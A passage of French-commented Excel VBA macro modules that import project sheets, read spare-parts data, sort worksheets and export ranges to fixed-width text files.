'    With Selection.Borders(xlEdgeBottom)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
'    With Selection.Borders(xlEdgeRight)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
'    With Selection.Borders(xlInsideVertical)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
'    With Selection.Borders(xlInsideHorizontal)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
'    Worksheets(shCde_Nomenclature).Cells(18, 2).Value = VBA.Date & " - " & VBA.Time
'
'Fin_Charge_LPdR_data:
'On Error GoTo 0
'
'End Sub


Public Sub Import_Affaire(wsSource As Worksheet, wsDest As Worksheet) 'Affaire As String)

    ' ****************
    ' Feuille Affaire
    ' *****************
    Dim i As Long
    Dim nb_max_lig As Long
    
    Dim Lig, nbligne, Col As Integer
    Dim val_range As Variant
    
    Dim Nom_Four As String
    
    Dim NomAffaire As String
    Dim Division  As String
    Dim Metier  As String
    Dim resp_aff_four As String
    Dim resp_etude_four As String
    Dim resp_doc_four As String
        
    Dim resp_aff_ren As String
    Dim resp_doc_ren As String
    Dim pilote_maint  As String
    Dim date_atfe As String
    Dim date_val_dec As String
    Dim Num_inv_pere As String
     
    ' mise en table
    Fin = False
    Col = 5
    Nom_Four = wsSource.Cells(2, Col).Value
    NomAffaire = wsSource.Cells(3, Col).Value
    
    Division = wsSource.Cells(7, Col).Value
    Metier = wsSource.Cells(8, Col).Value
    
    resp_aff_four = wsSource.Cells(15, Col).Value
    resp_etude_four = wsSource.Cells(16, Col).Value
    resp_doc_four = wsSource.Cells(17, Col).Value
    
    resp_aff_ren = wsSource.Cells(18, Col).Value
    resp_doc_ren = wsSource.Cells(19, Col).Value
    pilote_maint = wsSource.Cells(20, Col).Value
    
    date_atfe = wsSource.Cells(21, Col).Value
    date_val_dec = wsSource.Cells(22, Col).Value
    Num_inv_pere = wsSource.Cells(23, Col).Value
    nbligne = 29
    Fin = False

    While Not Fin
        If wsSource.Cells(nbligne, 1).Value <> vbNullString Or wsSource.Cells(nbligne, 8).Value <> vbNullString Then
            nbligne = nbligne + 1
        Else
            Fin = True
        End If
    Wend
    
    Col = 1
    For Col = 1 To 10
        For Lig = 29 To nbligne
            If wsSource.Cells(Lig, 1).Value = vbNullString And wsSource.Cells(Lig, 25).Value = vbNullString Then Fin = True
            table_aff(Lig, Col) = wsSource.Cells(Lig, Col).Value
        Next Lig
    Next Col

    Col = 5
    wsDest.Cells(2, Col).Value = Nom_Four
    wsDest.Cells(3, Col).Value = NomAffaire
    
    wsDest.Cells(4, Col).Value = "N"
    wsDest.Cells(5, Col).Value = "N"
    wsDest.Cells(6, Col).Value = "N"
    'wsDest.Cells(11, col).Value = "N"
    
    wsDest.Cells(7, Col).Value = Division
    wsDest.Cells(8, Col).Value = Metier
    
    wsDest.Cells(15, Col).Value = resp_aff_four
    wsDest.Cells(16, Col).Value = resp_etude_four
    wsDest.Cells(17, Col).Value = resp_doc_four
    
    wsDest.Cells(18, Col).Value = resp_aff_ren
    wsDest.Cells(19, Col).Value = resp_doc_ren
    wsDest.Cells(20, Col).Value = pilote_maint
    
    wsDest.Cells(21, Col).Value = date_atfe
    wsDest.Cells(22, Col).Value = date_val_dec
    wsDest.Cells(23, Col).Value = Num_inv_pere
    wsDest.Rows("29:59").Value = vbNullString
    wsDest.Rows("60:65536").Delete
    wsDest.Rows("29:65536").NumberFormat = "@"
       
    nb_max_lig = 0
    If wsSource.Cells(28, 15) > vbNullString Then
        If wsSource.Cells(29, 15) > vbNullString Then
            nb_max_lig = SheetCls.LastLineColumn(wsSource, 1)
        Else
            nb_max_lig = 29
        End If
    End If
    If Lig > nb_max_lig Then nb_max_lig = Lig
    For i = 29 To nb_max_lig
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
        wsDest.Range(val_range).Value = wsSource.Range(val_range).Value
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
        wsDest.Range(val_range).Font.Color = vbBlack
        wsDest.Range(val_range).Font.Bold = False
    Next i
End Sub


Public Sub Lire_PR(WsPiecesRechange As Worksheet, Lig As Variant)
    Dim Data_PR   As Variant
    Dim val_range As Variant
    Dim Pos, i    As Integer
    Dim Mes       As String

    val_range = VBA.LTrim(VBA.Str(Lig))
    val_range = "A" + val_range + ":AZ" + val_range
    Data_PR = WsPiecesRechange.Range(val_range).Value

    Num_ssen_PR = Data_PR(1, P_Num_ssen_PR)         '   1
    Repere_PR = Data_PR(1, P_Repere_PR)             '   2
    Categorie_PR = Data_PR(1, P_Categorie_PR)       '   3
    SacimMabec_PR = Data_PR(1, P_SacimMabec_PR)     '   4
    Etude_Ref_PR = Data_PR(1, P_Etude_Ref_PR)       '   5
    Etude_Ref_PR = VBA.Trim(Etude_Ref_PR)
    Pos = VBA.InStr(1, Etude_Ref_PR, "_")
    Etude_Suf_PR = vbNullString
    If Pos > 0 Then
        Etude_Suf_PR = VBA.Mid(Etude_Ref_PR, Pos + 1, VBA.Len(Etude_Ref_PR))
        Etude_Ref_PR = VBA.Mid(Etude_Ref_PR, 1, Pos - 1)
    End If
    Etude_Nom_PR = Data_PR(1, P_Etude_Nom_PR)           '   6
    
    Ref_Int_PR = Data_PR(1, P_Ref_Int_PR)           '   7
    Nom_Int_PR = Data_PR(1, P_Nom_Int_PR)           '   8

    Design_PR = Data_PR(1, P_Design_PR)             '   9
    Qte_PR = Data_PR(1, P_Qte_PR)                   '   10
    Qte_propo_PR = Data_PR(1, P_Qte_propo_PR)       '   11
    Delai_PR = Data_PR(1, P_Delai_PR)               '   12
    Prix_PR = Data_PR(1, P_Prix_PR)                 '   13
    Prix_Total_PR = Data_PR(1, P_Prix_PR)           '   14
    Qte_ret_PR = Data_PR(1, P_Qte_ret_PR)           '   15
    Prix_total_Ret_PR = Data_PR(1, P_Prix_total_Ret_PR) '   16
    Document_PR = Data_PR(1, P_Document_PR)         '   17
    Date_Modif_PR = Data_PR(1, P_Date_Modif_PR)     '   18
    Obs_PR = Data_PR(1, P_Obs_PR)                   '   19
    Code_EAN_PR = Data_PR(1, P_Code_EAN_PR)
    Code_Ano_PR = Data_PR(1, P_Code_Ano_PR)         '   20
    Code_Risque_PR = Data_PR(1, P_Code_Risque_PR)   '   21
    Piece_rech_PR = Data_PR(1, P_Piece_rech_PR)     '   22
    Tech_PR = Data_PR(1, P_Tech_PR)                 '   23
    Lib_court1_PR = Data_PR(1, P_Lib_court1_PR)     '   24
    Lib_court2_PR = Data_PR(1, P_Lib_court2_PR)     '   25
    Date_enrich_PR = Data_PR(1, P_Date_enrich_PR)   '   26
    Rapproche_PR = Data_PR(1, P_Rapproche_PR)       '   27
    Ref_Origine_PR = Data_PR(1, P_Ref_Origine_PR)
    Nom_Origine_PR = Data_PR(1, P_Nom_Origine_PR)
    Select Case ThisWorkbook.Worksheets(ShAffaire).Cells(20, 7).Value
    Case "1"
        ' cas de premi|fffd|re langue
        If Lib_court1_PR <> vbNullString Then
            Lib_PR = Lib_court1_PR
        Else
            Lib_PR = VBA.Mid(Design_PR, 1, 40)
        End If
    Case "2"
        ' cas de deuxi|fffd|me langue
        If Lib_court2_PR <> vbNullString Then
            Lib_PR = Lib_court2_PR
        Else
            Lib_PR = VBA.Mid(Design_PR, 1, 40)
        End If
    Case Else
        Lib_PR = Design_PR
    End Select
    Cle_Ref_PR = Etude_Ref_PR
    If Etude_Suf_PR > vbNullString Then Cle_Ref_PR = Etude_Ref_PR + "_" + Etude_Suf_PR
    Cle_Art_PR = Etude_Nom_PR + "_" + Cle_Ref_PR
    Mes = vbNullString
    For i = 1 To VBA.Len(Cle_Art_PR)
        If VBA.Mid(Cle_Art_PR, i, 1) <> " " Then Mes = Mes + VBA.Mid(Cle_Art_PR, i, 1)
    Next i
    Cle_Art_PR = Mes
    '**************************************
    Cle_Art_PR_Origine = Nom_Origine_PR + "_" + Ref_Origine_PR
    If Cle_Art_PR_Origine > vbNullString Then
    Mes = vbNullString
    For i = 1 To VBA.Len(Cle_Art_PR_Origine)
        If VBA.Mid(Cle_Art_PR_Origine, i, 1) <> " " Then Mes = Mes + VBA.Mid(Cle_Art_PR_Origine, i, 1)
    Next i
    Cle_Art_PR_Origine = Mes
    Else
        Cle_Art_PR_Origine = Cle_Art_PR
    End If
    '***************************************
End Sub


Sub Init_var_PR(WsPiecesRechange As Worksheet)
    Dim ind_col, ind As Integer
                  
    For ind = 1 To 50
        ind_col = VBA.val(VBA.UCase(WsPiecesRechange.Cells(1, ind).Value))
    
        If ind_col = 13 Then P_Num_ssen_PR = ind        '   1
        If ind_col = 12 Then P_Repere_PR = ind          '   2
        If ind_col = 19 Then P_Categorie_PR = ind       '   3
        If ind_col = 33 Then P_SacimMabec_PR = ind      '   4
        If ind_col = 21 Then P_Etude_Ref_PR = ind       '   5
        If ind_col = 23 Then P_Etude_Nom_PR = ind       '   6
        If ind_col = 29 Then P_Ref_Int_PR = ind         '   7
        If ind_col = 30 Then P_Nom_Int_PR = ind         '   8
        If ind_col = 24 Then P_Design_PR = ind          '   9
        
        If ind_col = 32 Then P_Qte_PR = ind             '   10
        If ind_col = 50 Then P_Qte_propo_PR = ind       '   11
        If ind_col = 51 Then P_Delai_PR = ind           '   12
        If ind_col = 52 Then P_Prix_PR = ind            '   13
        If ind_col = 53 Then P_Prix_Total_PR = ind      '   14
        If ind_col = 54 Then P_Qte_ret_PR = ind         '   15
        If ind_col = 55 Then P_Prix_total_Ret_PR = ind  '   16
        If ind_col = 43 Then P_Document_PR = ind        '   17
        If ind_col = 31 Then P_Code_EAN_PR = ind        '   18
    
        If ind_col = 40 Then P_Obs_PR = ind             '   19
        
        
        If ind_col = 45 Then P_Code_Ano_PR = ind       '    20
        If ind_col = 47 Then P_Code_Risque_PR = ind     '   21
        If ind_col = 42 Then P_Piece_rech_PR = ind      '   22
        If ind_col = 44 Then P_Tech_PR = ind            '   23
        
        
        If ind_col = 48 Then P_Lib_court1_PR = ind
        If ind_col = 49 Then P_Lib_court2_PR = ind      '
        If ind_col = 18 Then P_Date_Modif_PR = ind      '   32
        If ind_col = 58 Then P_Date_Valid_PR = ind      '   37
        If ind_col = 59 Then P_Date_Ident_PR = ind      '   38
        
        If ind_col = 56 Then P_Date_enrich_PR = ind
        If ind_col = 57 Then P_Rapproche_PR = ind
        If ind_col = 65 Then P_Ref_Origine_PR = ind
        If ind_col = 66 Then P_Nom_Origine_PR = ind
    Next
End Sub
Attribute VB_Name = "TDI_Mod_outils"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Module Outils
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 19/12/2007
'[Version       : V1.0 du 19/12/2007
'[---------------------------------------------------------------------------
'[Sujet: Module Outils
'[---------------------------------------------------------------------------


Function Derniere_Colonne(ByVal Onglet_Source As String, Ligne, Colonne_D|fffd|part As Long) As Long
    Dim Colonne_Source As Long
    Colonne_Source = Colonne_D|fffd|part
    Do
        If ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne, Colonne_Source).Value = vbNullString Then Exit Do Else Colonne_Source = Colonne_Source + 1
    Loop
    If Colonne_Source = Colonne_D|fffd|part Then Derniere_Colonne = Colonne_Source Else Derniere_Colonne = Colonne_Source - 1
End Function



'Public Function Derniere_Ligne(ByVal Onglet_Source As String, Ligne_D|fffd|part, Colonne As Long) As Long
'    Dim Ligne_Source As Long
'    Ligne_Source = Ligne_D|fffd|part
'    Do
'        If ThisWorkbook.Sheets(Onglet_Source).Cells(Ligne_Source, Colonne).Value = vbnullstring Then
'            Exit Do
'        Else
'            Ligne_Source = Ligne_Source + 1
'        End If
'    Loop
'    If Ligne_Source = Ligne_D|fffd|part Then
'        Derniere_Ligne = Ligne_Source
'    Else
'        Derniere_Ligne = Ligne_Source - 1
'    End If
'End Function


' affiche toute la feuille
Sub ShowAllRecords(ong As Variant) 'Worksheets(onglet).Activate
  Worksheets(ong).Activate
  If ActiveSheet.FilterMode Then ActiveSheet.ShowAllData
End Sub


Sub Suppression_Filtres()
   Dim sh As Worksheet
   For Each sh In ThisWorkbook.Worksheets
      If sh.AutoFilterMode Then
            On Error Resume Next
            sh.ShowAllData
            On Error GoTo 0
      End If
   Next
End Sub


Public Function sNonNull(rvVariant) As String
    'Renvoie un variant vide si le variant est null, sinon le variant lui meme
    'Permet de traiter des |fffd|l|fffd|ments vides plut|fffd|t que des |fffd|l|fffd|ments null qui g|fffd|n|fffd|rent des erreurs
    If IsNull(rvVariant) Then sNonNull = vbNullString Else sNonNull = rvVariant
End Function


'V|fffd|rifier Int|fffd|ret dans le TDI, Vient de TDM
Sub Tri_Poste_Technique_Decoupage()
    Tri_Decoupage False
End Sub


Sub Tri_Decoupage(Numero_Ordre As Boolean)
    Dim Ligne_Deb As Long, Ligne_Fin As Long
    With ThisWorkbook.Worksheets(shDecoupage)
        Ligne_Deb = FirstLine(shDecoupage)
        Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shDecoupage))
        
        'Tri sur Num|fffd|ro d'ordre ou sur Poste Technique
        If Numero_Ordre Then
            .Range("A" & Ligne_Deb & ":IV" & Ligne_Fin).Sort Key1:=.Range("A" & Ligne_Deb), Order1:=xlAscending, Header:=xlNo, _
                OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, DataOption1:=xlSortNormal
        Else
            .Columns("A").NumberFormat = "0"
            .Columns("IV:IV").NumberFormat = "General"
            .Range("IV" & Ligne_Deb).FormulaR1C1 = "=RC[-253] & RC[-252] & RC[-251] & RC[-250] & RC[-249] & RC[-248] & RC[-247]"
            .Range("IV" & Ligne_Deb).AutoFill Destination:=.Range("IV" & Ligne_Deb & ":IV" & Ligne_Fin), Type:=xlFillDefault
    
            .Range("A" & Ligne_Deb & ":IV" & Ligne_Fin).Sort Key1:=.Range("IV" & Ligne_Deb), Order1:=xlAscending, Header:=xlNo, _
                OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, DataOption1:=xlSortNormal
            
            .Columns("IV").Clear
        End If
    End With
End Sub
Attribute VB_Name = "TDI_Module1"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.0 du 06/07/2005
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


'------------------ GESTION DU PRESSE-PAPIER -------------
' Merci |fffd| Manfred Doerwald
'---------------------------------------------------------


'Public Sub EmptyClipboard()
''vide le presse-papier
'Dim Status As Long
'Dim ptr As Long, ghand As Long, handle As Long
'  ' open clipboard
'  Status = OpenClipboard(handle)
'  If Status <> 0 Then
'    'Delete clipboard contense
'    Status = EmptyClipboardLib()
'    'close clipboard
'    Status = CloseClipboard()
'    'free handle of global storage
'    Status = GlobalFree(ghand)
'  Else
'    MessageErreur "Error opening the clipboard!"
'    Exit Sub
'  End If
'End Sub




'Public Function GetClipboardText() As String
''R|fffd|cup|fffd|re le contenu du presse-papier
'Dim Status As Long
'Dim Text As String    '* 3000
'Dim Text2 As String
'Dim fmt As Variant
'Dim aFmts As Variant
'Dim ClipBoardFormatOK As Boolean
'
''v|fffd|rifs
'ClipBoardFormatOK = False
'aFmts = Application.ClipboardFormats
'For Each fmt In aFmts
'    If fmt = xlClipboardFormatText Then
'        ClipBoardFormatOK = True
'        Exit For
'    End If
'Next
'If Not ClipBoardFormatOK Then
'    GetClipboardText = vbnullstring
'    Exit Function
'End If
'
'  ' open clipboard
'  Status = OpenClipboard(handle)
'  If Status <> 0 Then
'    ' Example: reading clipboard contense
'    Text = GetClipboardData(CF_TEXT)
'    Text2 = vba.left(Text, vba.instr(Text,vba.chr(0)) - 1)
'     'close clipboard
'    Status = CloseClipboard()
'
'    GetClipboardText = Text2
'  Else
'    MessageErreur "Error opening the clipboard!"
'    GetClipboardText = vbnullstring
'    Exit Function
'  End If
'End Function



'Public Sub PutClipboardText(Text As String)
''Ecrit le texte dans le presse-papier
'  Dim Status As Long
'  Dim ptr As Long, ghand As Long, handle As Long
'
'  ' open clipboard
'  Status = OpenClipboard(handle)
'  If Status <> 0 Then
'    'Delete clipboard contense
'    Status = EmptyClipboardLib()
'    'get global storage for textstring contense
'    ghand = GlobalAlloc(0, (Len(Text) + 1))
'    'lock global storage
'    ptr = GlobalLock(ghand)
'    'copy of textstring contense
'    Status = MYlstrcpy(ptr, Text)
'    'free global storage
'    Status = GlobalUnlock(ghand)
'    'write to clipboard
'    Call SetClipboardData(CF_TEXT, ptr)
'    'close clipboard
'    Status = CloseClipboard()
'    'free handle of global storage
'    Status = GlobalFree(ghand)
'  Else
'    MsgBox "Error opening the clipboard!"
'    Exit Sub
'  End If
'
'End Sub


'Sub PutClipboardTextFile(file As String)
''|fffd|crit le contenu du fichier dans le presse-papiers
'Dim contenu As String
'Dim NumFichier As Integer
'
'NumFichier = FreeFile()
'Open file For Input Access Read Shared As #NumFichier
'contenu = Input(LOF(NumFichier), #NumFichier)
'PutClipboardText contenu
'Close NumFichier
'End Sub



'------------ Utilitaires de gestion de cha|fffd|nes -------------


'Sub ReplaceTextInFile(SourceFile As String, sText As String, rText As String)
''chercher/remplacer dans un fichier
'Dim TargetFile As String, tLine As String, tString As String, p As Integer, I As Long, F1 As Integer, f2 As Integer
'    TargetFile = "RESULT.TMP"
'    If Dir(SourceFile) = vbnullstring Then Exit Sub
'    If Dir(TargetFile) <> vbnullstring Then
'        On Error Resume Next
'        Kill TargetFile
'        On Error GoTo 0
'        If Dir(TargetFile) <> vbnullstring Then
'            MsgBox TargetFile & " already open, close and delete / rename the file and try again.", vbCritical
'            Exit Sub
'        End If
'    End If
'    F1 = FreeFile()
'    Open SourceFile For Input As F1
'    f2 = FreeFile()
'    Open TargetFile For Output As f2
'    I = 1 ' line counter
'    Application.StatusBar = "Reading data from " & TargetFile & " ..."
'    While Not EOF(F1)
'        If I Mod 100 = 0 Then Application.StatusBar = "Reading line #" & I & " in " & TargetFile & " ..."
'        Line Input #F1, tLine
'        If sText <> vbnullstring Then
'            ReplaceTextInString tLine, sText, rText
'        End If
'        Print #f2, tLine
'        I = I + 1
'    Wend
'    Application.StatusBar = "Closing files ..."
'    Close F1
'    Close f2
'    Kill SourceFile ' delete original file
'    Name TargetFile As SourceFile ' rename temporary file
'    Application.StatusBar = False
'End Sub


'Public Sub ReplaceTextInString(SourceString As String, SearchString As String, ReplaceString As String)
''chercher/remplacer dans une cha|fffd|ne
'Dim p As Integer, NewString As String
'    Do
'        p = vba.instr(p + 1, vba.ucase(SourceString), vba.ucase(SearchString))
'        If p > 0 Then ' replace SearchString with ReplaceString
'            NewString = vbnullstring
'            If p > 1 Then NewString = vba.mid(SourceString, 1, p - 1)
'            NewString = NewString + ReplaceString
'            NewString = NewString + vba.mid(SourceString, p + vba.len(SearchString), vba.len(SourceString))
'            p = p + vba.len(ReplaceString) - 1
'            SourceString = NewString
'        End If
'        If p >= vba.len(NewString) Then p = 0
'    Loop Until p = 0
'End Sub





'Sub ChangeBadChars(ByRef filename As String)
''enl|fffd|ve les charact|fffd|res de noms de fichiers interdits et les remplace par un "-"
'Dim CharactereInterdit As Variant
'Dim ListeCharacteresInterdits As Variant
'Dim Pos As Integer
'
'ListeCharacteresInterdits = Array("/", "\", "*", "?", ":", ">", "<", "|")
'For Each CharactereInterdit In ListeCharacteresInterdits
'    Pos = vba.instr(filename, CharactereInterdit)
'    Do While Pos > 0
'        filename = vba.left(filename, Pos - 1) & "-" & vba. vba.right(filename, vba.len(filename) - Pos)
'        Pos = vba.instr(filename, CharactereInterdit)
'    Loop
'Next
'End Sub
Function seconnecter() As String
seconnecter = "Data Source=" & Sheets("Parametrage des tables").Range("AE17").Value
End Function
Attribute VB_Name = "TDI_Module2"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.0 du 06/07/2005
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


Sub MessageErreur1(Message As String, Optional titre As String = "Macro")
    MsgBox Message, vbCritical, titre
    Close
    Application.StatusBar = False
    Application.Cursor = xlDefault
    End
End Sub


Function VerifMonoColonne(Selection As Range) As Boolean
    'v|fffd|rifie si le range donn|fffd| n'est constitu|fffd| que d'une colonne
    Dim NbColonnes As Integer
    Dim i As Integer
    Dim nbreZones As Integer
    
    nbreZones = Selection.Areas.Count
    If nbreZones <= 1 Then
        NbColonnes = Selection.Columns.Count
    Else
        For i = 1 To nbreZones
            NbColonnes = Selection.Areas(i).Columns.Count
        Next i
    End If
    If NbColonnes = 1 Then
        VerifMonoColonne = True
    Else
        VerifMonoColonne = False
    End If
End Function
Attribute VB_Name = "TDI_Module3"
'
'
'
'
'
'
''------------------ Gestion des dossiers -------------
'
'Private Type BROWSEINFO ' used by the function GetFolderName
'    hOwner As Long
'    pidlRoot As Long
'    pszDisplayName As String
'    lpszTitle As String
'    ulFlags As Long
'    lpfn As Long
'    lParam As Long
'    iImage As Long
'End Type
'
'Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
'Private Declare Function SHBrowseForFolder Lib "shell32.dll" Alias "SHBrowseForFolderA" (lpBrowseInfo As BROWSEINFO) As Long
'
'
'Public Function GetFolderName(Msg As String) As String
'' returns the name of the folder selected by the user
'Dim bInfo As BROWSEINFO, Path As String, r As Long, x As Long, Pos As Integer
'    bInfo.pidlRoot = &H11 ' Root folder = Desktop
'    If IsMissing(Msg) Then
'        bInfo.lpszTitle = "Select a folder." ' the dialog title
'    Else
'        bInfo.lpszTitle = Msg ' the dialog title
'    End If
'    bInfo.ulFlags = &H1 ' Type of directory to return
'    x = SHBrowseForFolder(bInfo) ' display the dialog
'    ' Parse the result
'    Path = Space$(512)
'    r = SHGetPathFromIDList(ByVal x, ByVal Path)
'    If r Then
'        Pos = vba.instr(Path, Chr$(0))
'        GetFolderName = vba.left(Path, Pos - 1)
'    Else
'        GetFolderName = vbnullstring
'    End If
'End Function
Attribute VB_Name = "TDI_Module4"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.0 du 06/07/2005
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------

'   MACRO pour enregistrer la feuille active en tant que fichier |fffd| taille de colonnes fixes ("FixedWidth")
'(c) Sylvain DECAUX     2002
'
'
'Historique :
'   16/09/02    1|fffd|re version
'   25/09/02    correction d'un bug : derni|fffd|re colonne tronqu|fffd|e d'1 caract|fffd|re
'   22/07/03    contr|fffd|le sur la taille min
'   29/09/03    contr|fffd|le si une feuille est ouverte
'   03/10/03    ajout de SaveRangeAsFixedText, correction d'un bug dans ExportRangeAsFixedText



Private Const MacroTitle = "Exportation en Texte Fixe"

'Sub SaveSheetAsFixedText()
''Enregistre la feuille active en tant que fichier |fffd| taille de colonnes fixes ("FixedWidth")
''en utilisant les valeurs de la 1|fffd|re ligne pour les tailles des colonnes
''(c) Sylvain DECAUX     2002
'Dim destfile As Variant, UsedRangeString As String, RangeToSave As String
'Dim Widths() As Integer
'Dim nbColonnes As Integer
'Dim I As Integer
'
''v|fffd|rifications
'If ActiveSheet Is Nothing Then MessageErreur1 "Il faut au moins une feuille active !", MacroTitle
'If ActiveSheet.Type <> xlWorksheet Then MessageErreur1 "La macro ne s'applique que sur les feuilles de calcul", MacroTitle
'If ActiveSheet.UsedRange.Rows.Count < 2 Then MessageErreur1 "Il doit y avoir au moins 2 lignes !", MacroTitle
'nbColonnes = ActiveSheet.UsedRange.Columns.Count
'If nbColonnes = 0 Then MessageErreur1 "Il doit y avoir au moins 1 colonne !", MacroTitle
'
''determine les param|fffd|tres de la feuille |fffd| traiter
'destfile = Application.GetSaveAsFilename(ActiveSheet.Name, "Fichiers texte (*.txt), *.txt", , "Enregistrer la feuille en tant que fichier texte |fffd| taille fixe")
'If destfile = False Then Exit Sub
'If ActiveWorkbook.Sheets.Count > 1 Then MsgBox "La macro n'enregistre que la feuille active", vbInformation, MacroTitle
''zone= tout sauf la premi|fffd|re ligne
'UsedRangeString = ActiveSheet.UsedRange.AddressLocal(False, False, xlA1)
''RangeToSave = "A2:" & vba. vba.right(UsedRangeString, vba.len(UsedRangeString) - 3)
'RangeToSave = "A2:" & vba. vba.right(UsedRangeString, 2)
''remplit le tableau des largeurs de texte
'ReDim Widths(nbColonnes)
'For I = 1 To nbColonnes
'    If Not vba.IsNumeric(ActiveSheet.Cells(1, I).Value) Then
'        MsgBox "Les valeurs de la 1|fffd|re ligne doivent |fffd|tre num|fffd|riques", vbExclamation
'        Exit Sub
'    End If
'    Widths(I) = CInt(ActiveSheet.Cells(1, I).Value)
'Next I
'
'ExportRangeAsFixedText ActiveWorkbook.Name, ActiveSheet.Name, RangeToSave, Widths, CStr(destfile), True, True, False, False
'
'End Sub
'
'
Sub SaveRangeAsFixedText(SourceRange As Range, WidthList As Variant, TargetFile As String)
'Enregistre la zone sp|fffd|cifi|fffd|e en tant que fichier |fffd| taille de colonnes fixes ("FixedWidth")
'SourceRange: zone |fffd| exporter
'WidthList: sous forme de tableau, la liste des tailles de colonnes
'TargetFile: cehmin complet du fichier |fffd| g|fffd|n|fffd|rer
Dim i As Integer
Dim Mes As String

'v|fffd|rification des param|fffd|tres
If Not IsArray(WidthList) Then MessageErreur1 "Erreur de param|fffd|tre"
If IsEmpty(WidthList) Then MessageErreur1 "Erreur de param|fffd|tre"
For i = LBound(WidthList) To UBound(WidthList)
    If Not VBA.IsNumeric(WidthList(i)) Then MessageErreur1 "Erreur de param|fffd|tre"
Next i
If TargetFile = vbNullString Then Exit Sub

'exportation
Mes = SourceRange.Address(False, False, xlA1)
ExportRangeAsFixedText SourceRange.Worksheet.parent.Name, SourceRange.Worksheet.Name, SourceRange.Address(False, False, xlA1), WidthList, TargetFile, True, True, False, False
End Sub





'================ (c) Erlandsen Data Consulting  ============
Private Sub ExportRangeAsFixedText(SourceWB As String, SourceWS As String, SourceAddress As String, ByRef WidthTable As Variant, _
    TargetFile As String, LeftAlign As Boolean, SaveValues As Boolean, ExportLocalFormulas As Boolean, AppendToFile As Boolean)
' Exports the data in Workbooks(SourceWB).Worksheets(SourceWS).Range(SourceAddress) to
' the textfile TargetFile in fixed-width format, uses the column widths in SourceAddress as field lengths
' Example:     ExportRangeAsFixedText ThisWorkbook.Name, "ExportSheet", "A3:E23", "C:\FolderName\FixedWidthText.txt", False, True, True, False


Dim SourceRange As Range, A As Integer, ColWidth As Integer, eCount As Long
Dim r As Long, C As Integer, totr As Long, pror As Long
Dim fn As Integer, LineString As String, tLine As String
    ' validate the input data if necessary
    Workbooks(SourceWB).Activate
    Worksheets(SourceWS).Activate
    'If Application.WorksheetFunction.CountA(Range(SourceAddress)) = 0 Then Exit Sub
    If Not AppendToFile Then
        If Dir(TargetFile) <> vbNullString Then
            On Error Resume Next
            Kill TargetFile
            On Error GoTo 0
            If Dir(TargetFile) <> vbNullString Then
                'MsgBox TargetFile & " already exists, rename, move or delete the file before you try again.", vbInformation, MacroTitle
                 MsgBox TargetFile & " existe d|fffd|j|fffd|. Vous devez l'enlever et recommencer", vbExclamation, MacroTitle
                Exit Sub
            End If
        End If
    End If
    If Not IsArray(WidthTable) Then
        MsgBox ("Erreur de param|fffd|tre")
        Exit Sub
    End If
    
    ' perform export
    eCount = 0
    Set SourceRange = Range(SourceAddress)
    On Error GoTo NotAbleToExport
    fn = FreeFile()
    Open TargetFile For Append As #fn ' open textfile for new input
    '************************************
    ' modif pour format unicode
    Print #fn, VBA.Chr(255) & VBA.Chr(254);
    '************************************
    On Error GoTo 0
    ' determine the total number of rows to process
    totr = 0
    For A = 1 To SourceRange.Areas.Count
        totr = totr + SourceRange.Areas(A).Rows.Count
    Next A
    ' start writing the fixed-width textfile
    pror = 0
    For A = 1 To SourceRange.Areas.Count
        For r = 1 To SourceRange.Areas(A).Rows.Count
            LineString = vbNullString
            For C = 1 To SourceRange.Areas(A).Columns.Count
                If IsNull(WidthTable) Then      'si les valeurs ne sont pas sp|fffd|cifi|fffd|es, on prend la largeur de la colonne
                    ColWidth = CInt(SourceRange.Areas(A).Columns(C).ColumnWidth)
                Else
                    ColWidth = WidthTable(C - 1)    'on commence le tableau |fffd| 0
                End If
                tLine = vbNullString
                On Error Resume Next
                If SaveValues Then
                    tLine = SourceRange.Areas(A).Cells(r, C).Value
                Else
                    If ExportLocalFormulas Then
                        tLine = SourceRange.Areas(A).Cells(r, C).FormulaLocal
                    Else
                        tLine = SourceRange.Areas(A).Cells(r, C).Formula
                    End If
                End If
                On Error GoTo 0
                ' create fixed-width string
                If VBA.Len(tLine) > ColWidth Then   'la donn|fffd|e ne rentre pas !
                    eCount = eCount + 1
                    'tLine = vba.left(tLine, ColWidth)
                    LineString = "## Erreur: donn|fffd|e plus grande que la largeur sp|fffd|cifi|fffd|e (ligne " & r + 1 & ", colonne " & C & ")."
                    Exit For
                Else
                    If LeftAlign Then
                        tLine = tLine & VBA.Space(ColWidth - VBA.Len(tLine))
                    Else
                        tLine = VBA.Space(ColWidth - VBA.Len(tLine)) & tLine
                    End If
                End If
                LineString = LineString & tLine
            Next C
            pror = pror + 1
            If pror Mod 50 = 0 Then
